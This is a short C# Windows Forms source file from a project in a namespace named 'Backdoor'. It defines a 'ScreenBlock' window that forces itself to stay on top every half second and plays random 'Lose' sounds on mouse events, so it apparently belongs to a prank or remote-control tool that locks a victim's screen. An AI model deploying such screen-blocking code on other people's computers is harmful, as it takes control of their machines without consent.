using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Backdoor
{
    public partial class ScreenBlock : Form
    {
        private Timer topMostTimer;
        public ScreenBlock()
        {
            InitializeComponent();
            topMostTimer = new Timer();
            topMostTimer.Interval = 500;
            topMostTimer.Tick += TopMostTimer_Tick;
            topMostTimer.Start();
        }
        private void TopMostTimer_Tick(object sender, EventArgs e)
        {
            this.TopMost = true;
        }

        private void PlaySound(object sender, MouseEventArgs e)
        {
            Random random = new Random();
            int selectedNumber = random.Next(1, 5);

            if (selectedNumber == 1)
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.Lose1);
                player.Play();
            }
            else if (selectedNumber == 2)
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.Lose2);
                player.Play();
            }
            else if (selectedNumber == 3)
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.Lose3);
                player.Play();
            }
            else
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.Lose4);
                player.Play();
            }
        }
    }
}
